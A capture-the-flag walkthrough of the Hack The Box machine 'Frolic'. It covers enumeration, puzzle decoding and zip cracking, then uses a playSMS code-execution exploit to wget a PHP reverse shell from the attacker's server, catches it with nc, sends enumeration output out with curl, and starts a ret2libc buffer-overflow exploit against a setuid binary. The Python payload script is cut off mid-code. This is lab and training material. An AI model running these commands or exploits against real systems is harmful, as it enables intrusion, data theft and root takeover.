# Frolic

```
kali@kali:~/htb/Frolic$ sudo nmap -sV -sC 10.129.1.92 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 11:23 EST
Nmap scan report for 10.129.1.92
Host is up (0.029s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h50m00s, deviation: 3h10m31s, median: 0s
|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2021-02-03T21:53:27+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-03T16:23:27
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.72 seconds
kali@kali:~/htb/Frolic$ 
```

I run a smbmap to see whats up:

```
kali@kali:~/htb/Frolic$ smbmap -H 10.129.1.92
[+] Guest session       IP: 10.129.1.92:445     Name: 10.129.1.92                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (frolic server (Samba, Ubuntu))
kali@kali:~/htb/Frolic$ 
```

I check the webpage on port 9999, but get this error on firefox: "SSL_ERROR_RX_RECORD_TOO_LONG"

to fix this, I went to firefox, opened a tab with "about:config" in the URL bar and changed: "security.tls.version.min" to 1 and "security.tls.version.max" to 3.

Reload the page without https. Just http.

we get an nginx installation confirmation page. I check some default directories like admin etc. and run wfuzz.

```
kali@kali:~/htb/Frolic$ sudo wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.1.92:9999/FUZZ
[sudo] password for kali: 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.0.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.1.92:9999/FUZZ
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                         
===================================================================

000000001:   200        28 L     71 W     637 Ch      "# directory-list-2.3-medium.txt"                               
000000007:   200        28 L     71 W     637 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/
                                                      "                                                               
000000003:   200        28 L     71 W     637 Ch      "# Copyright 2007 James Fisher"                                 
000000014:   200        28 L     71 W     637 Ch      "http://10.129.1.92:9999/"                                      
000000006:   200        28 L     71 W     637 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this" 
000000011:   200        28 L     71 W     637 Ch      "# Priority ordered case sensative list, where entries were foun
                                                      d"                                                              
000000005:   200        28 L     71 W     637 Ch      "# This work is licensed under the Creative Commons"            
000000013:   200        28 L     71 W     637 Ch      "#"                                                             
000000010:   200        28 L     71 W     637 Ch      "#"                                                             
000000008:   200        28 L     71 W     637 Ch      "# or send a letter to Creative Commons, 171 Second Street,"    
000000009:   200        28 L     71 W     637 Ch      "# Suite 300, San Francisco, California, 94105, USA."           
000000012:   200        28 L     71 W     637 Ch      "# on atleast 2 different hosts"                                
000000002:   200        28 L     71 W     637 Ch      "#"                                                             
000000004:   200        28 L     71 W     637 Ch      "#"                                                             
000000259:   200        25 L     63 W     634 Ch      "admin"                                                         
000000611:   200        1006 L   5031 W   84160 Ch    "test"                                                          
000000834:   403        7 L      11 W     178 Ch      "dev"                                                           
000001626:   200        3 L      3 W      28 Ch       "backup"                                                        
000011661:   403        7 L      11 W     178 Ch      "loop"                                                          
000045240:   200        28 L     71 W     637 Ch      "http://10.129.1.92:9999/"                                      

Total time: 696.0894
Processed Requests: 220560
Filtered Requests: 220540
Requests/sec.: 316.8558
```

Test contains config info. 

admin is a login form that says "c'mon im hackable" With a designated number of login attempts. Seems like 3.

backup is a page with the text `password.txt user.txt loop/ `

Interesting, let's see if we can get those credentials.

/loop/user.txt does not work. we get a 404 not found. /loop alone gives a 403 forbidden. And straight /user.txt also gives a 404.

/backup/user.txt gives us `user - admin` and password.txt gives us `password - imnothuman`

Putting them into the login form results in an error. I also notice the `Note:Nothing` So I try just blank creds, but It doesn't work. I also try Note:Nothing, but again nothing.

I'm pretty sure it's not even sending anything.

I also try entering ssh with admin@10.129.1.92 but it requires password. And admin:imnothuman does not work.


I check the home-page again, and see this `Thank you for using nginx. http://forlic.htb:1880 `

So I add forlic.htb to my /etc/hosts file and try that. It works. I'm presented with a Node-RED login page.

I try admin:imnothuman. But it does not work.  I also try the default Node-RED creds of NR_account:NodeRed#0123 as well as NR_account:imnothuman


I go back to the first login-page and check the firefox debugger. I find login.js which states:

```
if ( username == "admin" && password == "superduperlooperpassword_lol"){
alert ("Login successfully");
window.location = "success.html"; // Redirecting to other page.
```

Should probably have checked that sooner...

And I get this:

```
..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. 
```


Maybe some kind of ASCII art? I try adjusting the window a bit, but can't see anything.


/dev still responds with a 403 forbidden. And so does /loop.

I also try the login on Node-RED, but it does not work.


I google the weird message, and figure out it's a language called OOK!. I decode it with https://www.dcode.fr/ook-language and get this:


`Nothing here check /asdiSIAJJ0QWE9JAS`

This gives:

```
UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA 
```

I throw this in Cyberchef with the magic operation, I don't get anything from the whole message, but when I separate by the space, I see the it begins with "PK.." if decoded by base64. So I do that.

"PK.." means a zipped file.

```
PK....	...Ã.7M#þ[.°...i...	...index.phpUT	...|§[.|§[ux.............^Dæ.J.s²h.)...Pðn.©¿Ssä.Jw..Ü.å 4âöÙ.kîzÐ..UÈ.ì+Xº.àPÈá.á¶.¤êÐ»âx_.ÀN.[ý..Sªê8ò.òâ..J2SÇ*..DÐ.}.8dT.Q.kÞ.Ê×ãäûj_..ù.é.À'x.c.Â.Ý.t¾²75Q¬.......k.,4µÙb)¾4Fµé.	ÿº.ã.êéïÇ&q2o.WÔ.ã9PK..#þ[.°...i...PK......	...Ã.7M#þ[.°...i...	...........¤.....index.phpUT....|§[ux.............PK..........O.........
```

I try adding it to a file and unzipping with 7zip.

```
kali@kali:~/htb/Frolic$ 7z x index.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 9 3900X 12-Core Processor             (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 436 bytes (1 KiB)

Extracting archive: index.zip
ERROR: index.zip
index.zip
Open ERROR: Can not open the file as [zip] archive


ERRORS:
Is not archive
    
Can't open as archive: 1
Files: 0
Size:       0
Compressed: 0
```

I try going to "http://10.129.1.92:9999/asdiSIAJJ0QWE9JAS/index.php" but it just shows the same string.

Same with backup/index.php

I suspect my operations have corrupted the archive in some way, so I decide to do everything via termina instead of cyberchef.


```
kali@kali:~/htb/Frolic$ echo "UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA" | base64 -d > index.zip
```

When I now try to unzip:

```
kali@kali:~/htb/Frolic$ 7z x index.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 9 3900X 12-Core Processor             (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 360 bytes (1 KiB)

Extracting archive: index.zip
--
Path = index.zip
Type = zip
Physical Size = 360

    
Enter password (will not be echoed):
ERROR: Wrong password : index.php
                
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
```

I get a password prompt. imnothuman was not correct. Same with superduperlooperpassword_lol

I decide to see if the password is easily cracked with john:

```
kali@kali:~/htb/Frolic$ zip2john index.zip > index_hash
ver 2.0 efh 5455 efh 7875 index.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=176, decmplen=617, crc=145BFE23
kali@kali:~/htb/Frolic$ cat index_hash 
index.zip/index.php:$pkzip2$1*2*2*0*b0*269*145bfe23*0*43*8*b0*145b*89c3*5e44e6104a9f73b2688a299a1b9550f06e0ba9bf5373e4024a771a11dc8ee5a034e2f6d98f6bee7ad0128a55c896ec2b58ba7fe050c8e112e1b687a4ead0bbe2785f13c04e895bfd8d8453aaea38f283f2e20f914a3253c72a830344d08d7d933864540e51026bde10cad7e3e4fb6a5f9f8bf918e994c027787f6390c216dd8f74beb2373551ac0b9a8a030e95106b032c34b5d96229be3446b5e90609ffba84e396eae9efc72671326f8857d49ce339*$/pkzip2$:index.php:index.zip::index.zip
kali@kali:~/htb/Frolic$ john index_hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
password         (index.zip/index.php)
1g 0:00:00:00 DONE 2/3 (2021-02-03 13:55) 7.142g/s 216657p/s 216657c/s 216657C/s 123456..ferrises
Use the "--show" option to display all of the cracked passwords reliably
Session completed
kali@kali:~/htb/Frolic$ 
```

So the password was simply "password".

```
kali@kali:~/htb/Frolic$ cat index.php
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```

This is hex, when decrypted with `echo "hex" | xxd -r -p`, it reveals base64, when that is decrypted, it reveals brainfuck code.

This brainfuck code translates to: "idkwhatispass". I try this with the Node-RED login, but it does not work. I try with both admin and NR_account.

I also try everything on ssh. With root, admin, frolic, forlic, robot(cause of the imnothuman password), and NR_account as usernames.

At this point, I'm fairly stuck. So I decide to enumerate again. I fuzz each directory on the webpage. Looking for php, txt, and directories. Run some more nmap scans with different flags to see if there's a port I missed.

and I find /dev/backup in one of the fuzz scans.

/dev/backup contains the text: `/playsms `

I enter http://10.129.1.92:9999/playsms

And I'm redirected to another login page.

admin:idkwhatispass was correct.

And we got a playSMS admin panel.

In the main config we have access to edit the information page. This is the index.php default page. I'm thinking we can put in a reverse shell here.

However, when I try to save the page, I get a no access error.

I decide to try a searchploit search:

```
kali@kali:~/htb/Frolic$ searchsploit playSMS
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)                                                                                      | php/remote/44598.rb
PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metasploit)                                                                                      | php/remote/48335.rb
PlaySms 0.7 - SQL Injection                                                                                                                                             | linux/remote/404.pl
PlaySms 0.8 - 'index.php' Cross-Site Scripting                                                                                                                          | php/webapps/26871.txt
PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                                                                                                                   | php/webapps/7687.txt
PlaySms 0.9.5.2 - Remote File Inclusion                                                                                                                                 | php/webapps/17792.txt
PlaySms 0.9.9.2 - Cross-Site Request Forgery                                                                                                                            | php/webapps/30177.txt
PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload                                                                                      | php/webapps/42003.txt
PlaySMS 1.4 - 'import.php' Remote Code Execution                                                                                                                        | php/webapps/42044.txt
PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)                                                                                  | php/remote/44599.rb
PlaySMS 1.4 - Remote Code Execution                                                                                                                                     | php/webapps/42038.txt
PlaySMS 1.4.3 - Template Injection / Remote Code Execution                                                                                                              | php/webapps/48199.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
kali@kali:~/htb/Frolic$ 
```

I check out a few, and most seem similar. We are essentially creating new accounts, and changing the User-Agent string to a php string. This will then be executed when the admin checks online status.

I find a version here: https://github.com/jasperla/CVE-2017-9101.

This gives us code execution!

To gain reverse shell, I set up a python webserver with:

```
kali@kali:~/htb/Frolic$ sudo python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

And download the php file on the target:

```
kali@kali:~/htb/Frolic$ python3 playsmshell.py --url http://10.129.1.92:9999/playsms --password idkwhatispass -c 'wget 10.10.14.70:8000/php-reverse-shell.php'[*] Grabbing CSRF token for login
[*] Attempting to login as admin
[+] Logged in!
[*] Grabbing CSRF token for phonebook import
[*] Attempting to execute payload
kali@kali:~/htb/Frolic$ 
```

And then browse to http://10.129.1.92:9999/playsms/php-reverse-shell.php

On the listener:

```
kali@kali:~/htb/Frolic$ sudo nc -nlvp 1337
[sudo] password for kali: 
Listening on 0.0.0.0 1337
Connection received on 10.129.1.92 42258
Linux frolic 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:22:43 UTC 2018 i686 athlon i686 GNU/Linux
 03:38:00 up 17:59,  0 users,  load average: 0.03, 0.04, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

So, now I'll improve the shell. with `python -c 'import pty;pty.spawn("/bin/bash")'`, `ctrl+Z`,`stty raw -echo`, `fg`, `reset`, `xterm`

I try sudo -l, but it requires a password. 


We have two users: ayush and sahay

I'll try logging in with the passwords we have acquired, but none work.


I upload LinEnum.sh with wget and my python server. And change the permissions with chmod 777, to run the script.


I send the script back over with 

`curl -F filename=enum.txt -F upload=@enum.txt http://10.10.14.70:80`


and recieve it with 

`sudo nc -nlvp 80 > enum.txt`

Now I can more easily read through the results, and do stuff on the target at the same time.

The script says that we have two admin users: syslog, and sahay. I try to log into syslog with the "imnothuman" password. But it does not work.


I also see that user sahay, has recently used sudo.

I check out /home/sahay/ and find the directory node-red. In here, I find the file settings.js. Which contains:


```
    adminAuth: {
        type: "credentials",
        users: [{
            username: "admin",
            password: "$2a$08$M6GkqpR1GdCDkQYXsR4zGOCl4gA/vWgNBSNKzCRr2RFKyYJNf08q.",
            permissions: "*"
        }]
    },
```

I copy this to a file and run it through john. And it's "password" again. Can't believ I didn't try that. I try it on the website, but it just hangs forever.

in /home/sahay/.config/composer I find two public keys. 

```
www-data@frolic:/home/sahay/.config/composer$ ls -la     
total 20
drwxr-xr-x 2 root root 4096 Sep 23  2018 .
drwxr-xr-x 3 root root 4096 Sep 23  2018 ..
-rw-r--r-- 1 root root   13 Sep 23  2018 .htaccess
-rw-r--r-- 1 root root  799 Sep 23  2018 keys.dev.pub
-rw-r--r-- 1 root root  799 Sep 23  2018 keys.tags.pub
www-data@frolic:/home/sahay/.config/composer$ cat keys.dev.pub 
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAnBDHjZS6e0ZMoK3xTD7f
FNCzlXjX/Aie2dit8QXA03pSrOTbaMnxON3hUL47Lz3g1SC6YJEMVHr0zYq4elWi
i3ecFEgzLcj+pZM5X6qWu2Ozz4vWx3JYo1/a/HYdOuW9e3lwS8VtS0AVJA+U8X0A
hZnBmGpltHhO8hPKHgkJtkTUxCheTcbqn4wGHl8Z2SediDcPTLwqezWKUfrYzu1f
o/j3WFwFs6GtK4wdYtiXr+yspBZHO3y1udf8eFFGcb2V3EaLOrtfur6XQVizjOuk
8lw5zzse1Qp/klHqbDRsjSzJ6iL6F4aynBc6Euqt/8ccNAIz0rLjLhOraeyj4eNn
8iokwMKiXpcrQLTKH+RH1JCuOVxQ436bJwbSsp1VwiqftPQieN+tzqy+EiHJJmGf
TBAbWcncicCk9q2md+AmhNbvHO4PWbbz9TzC7HJb460jyWeuMEvw3gNIpEo2jYa9
pMV6cVqnSa+wOc0D7pC9a6bne0bvLcm3S+w6I5iDB3lZsb3A9UtRiSP7aGSo7D72
8tC8+cIgZcI7k9vjvOqH+d7sdOU2yPCnRY6wFh62/g8bDnUpr56nZN1G89GwM4d4
r/TU7BQQIzsZgAiqOGXvVklIgAMiV0iucgf3rNBLjjeNEwNSTTG9F0CtQ+7JLwaE
wSEuAuRm+pRqi8BRnQ/GKUcCAwEAAQ==
-----END PUBLIC KEY-----
www-data@frolic:/home/sahay/.config/composer$ cat keys.tags.pub 
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA0Vi/2K6apCVj76nCnCl2
MQUPdK+A9eqkYBacXo2wQBYmyVlXm2/n/ZsX6pCLYPQTHyr5jXbkQzBw8SKqPdlh
vA7NpbMeNCz7wP/AobvUXM8xQuXKbMDTY2uZ4O7sM+PfGbptKPBGLe8Z8d2sUnTO
bXtX6Lrj13wkRto7st/w/Yp33RHe9SlqkiiS4MsH1jBkcIkEHsRaveZzedUaxY0M
mba0uPhGUInpPzEHwrYqBBEtWvP97t2vtfx8I5qv28kh0Y6t+jnjL1Urid2iuQZf
noCMFIOu4vksK5HxJxxrN0GOmGmwVQjOOtxkwikNiotZGPR4KsVj8NnBrLX7oGuM
nQvGciiu+KoC2r3HDBrpDeBVdOWxDzT5R4iI0KoLzFh2pKqwbY+obNPS2bj+2dgJ
rV3V5Jjry42QOCBN3c88wU1PKftOLj2ECpewY6vnE478IipiEu7EAdK8Zwj2LmTr
RKQUSa9k7ggBkYZWAeO/2Ag0ey3g2bg7eqk+sHEq5ynIXd5lhv6tC5PBdHlWipDK
tl2IxiEnejnOmAzGVivE1YGduYBjN+mjxDVy8KGBrjnz1JPgAvgdwJ2dYw4Rsc/e
TzCFWGk/HM6a4f0IzBWbJ5ot0PIi4amk07IotBXDWwqDiQTwyuGCym5EqWQ2BD95
RGv89BPD+2DLnJysngsvVaUCAwEAAQ==
-----END PUBLIC KEY-----
www-data@frolic:/home/sahay/.config/composer$ 
```

But they don't result in anything.

I decide to take a look in the other non-admin home folder, and I find the file rop in /home/ayush/.binary

```
www-data@frolic:/home/ayush/.binary$ file rop
rop: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=59da91c100d138c662b77627b65efbbc9f797394, not stripped
www-data@frolic:/home/ayush/.binary$ ls -la rop
-rwsr-xr-x 1 root root 7480 Sep 25  2018 rop
www-data@frolic:/home/ayush/.binary$ ./rop
[*] Usage: program <message>
```

Ok, let's see if we can decompile how this executable works.

I check if the machine has GDB installed with `which gdb` and get no results. So I have to transfer the file.

On the reverse shell:

```
www-data@frolic:/home/ayush/.binary$ nc 10.10.14.70 1400 < rop
```

And on the listener.

```
kali@kali:~/htb/Frolic$ sudo nc -nlvp 1400 > rop
Listening on 0.0.0.0 1400
Connection received on 10.129.1.92 48454
```

So now we can look at it closer.

We know from examining it with file, that it is a setuid executable. Which means it will run with the permissions of the owner, not the user running it. In this case, it is root.


I throw it into Ghidra. And check the functions on the left side of the UI.

```
undefined4 main(int param_1,int param_2)

{
  undefined4 uVar1;
  
  setuid(0);
  if (param_1 < 2) {
    puts("[*] Usage: program <message>");
    uVar1 = 0xffffffff;
  }
  else {
    vuln(*(char **)(param_2 + 4));
    uVar1 = 0;
  }
  return uVar1;
}
```

So we see that the function "vuln" is being run.

```
void vuln(char *param_1)

{
  char local_34 [48];
  
  strcpy(local_34,param_1);
  printf("[+] Message sent: ");
  printf(local_34);
  return;
}
```

So it is creating an array called local_34, with 48 char elements. It is then copying our input into that array. So the array is our input buffer.

If our input is larger than 48 elements. It will go outside the array. An overflow if you will. 

So we are overflowing the buffer.


What we need to do now is figure out the offset where the overflow happens.

So where is the excess input being dumped.

So to do this I'm going to use gdb-peda. Which has some nifty tools for improving workflow in the decompiler: https://github.com/longld/peda 

We are first creating a pattern to put as the argument of the program.

Then we identify where the program crashes.

And then locate the offset at that address. 

I also get the exit address at the end.

```
gdb-peda$ pattern_create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
Starting program: /home/kali/htb/Frolic/rop 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x79 ('y')
EBX: 0xffffd640 --> 0x2 
ECX: 0x0 
EDX: 0xffffd63c --> 0xf7df0e00 (<__libc_start_main>:    call   0xf7f10f89)
ESI: 0xf7fb2000 --> 0x1dfd6c 
EDI: 0xf7fb2000 --> 0x1dfd6c 
EBP: 0x31414162 ('bAA1')
ESP: 0xffffd610 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x41474141 ('AAGA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41474141
[------------------------------------stack-------------------------------------]
0000| 0xffffd610 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd614 ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffd618 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffd61c ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffd620 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffd624 ("AA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffd628 ("AJAAfAA5AAKAAgAA6AAL")
0028| 0xffffd62c ("fAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41474141 in ?? ()
gdb-peda$ pattern offset 0x41474141
1095188801 found at offset: 52
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ p exit
$1 = {<text variable, no debug info>} 0xf7e09360 <exit>
```

We can also see that only NX is enabled. NX essentially creates areas that are only used for storage or instructions. And not executable code. But we should be able to circumvent that alone.

Now we head back to the target machine before we can create the overflow, and we get some more information:

```
www-data@frolic:/home/ayush/.binary$ ldd rop | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system            
   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " exit@"
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
www-data@frolic:/home/ayush/.binary$ strings -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 15ba0b /bin/sh
```

ldd is "List Dynamic Dependencies" It prints the shared libraries required by a program.

readelf displays information about elf executables.

-s displays informations about different sections of the file. here we are looking for the system and exit sections.

strings -t prints the location of the string as well. And the x after means print the location in hexadecimal.


So we have the offsets:

- Overflow offset = 52

- libc main offset = 0xb7e19000

- libc system offset = 0x0003ada0

- exit offset = 0x0002e9d0

- shell offset = 0x0015ba0b 



```
import subprocess, struct

# "<I" means little-endian unsigned Integer.

# libc       + system
# 0xb7e19000 + 0x0003ada0
system = struct.pack("<I", 0xb7e53da0)

# libc       + shell
# 0xb7e19000 + 0x15ba0b
shell = struct.pack("<I", 0xb7f74a0b)

# libc       + exit
